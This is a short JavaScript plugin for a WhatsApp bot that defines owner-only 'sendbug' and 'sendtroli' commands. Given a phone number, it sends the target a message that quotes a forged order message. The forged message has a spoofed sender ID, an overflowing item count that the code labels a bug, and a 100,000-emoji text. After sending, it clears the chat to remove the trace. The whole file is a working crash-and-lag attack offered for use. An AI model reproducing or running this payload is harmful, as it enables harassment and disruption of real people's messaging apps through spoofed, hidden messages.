let handler = async (m, { conn, text, args, usedPrefix, command }) => {
if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} +62 123-4567-8910`
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Ini Apaan?', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 99999999999999999999999999999999999999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(100000),
    orderTitle: 'ziziz', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
handler.tags = ['owner', 'update']
handler.command = /^(sendtroli|sendbug)$/i
handler.owner = true 

module.exports = handler
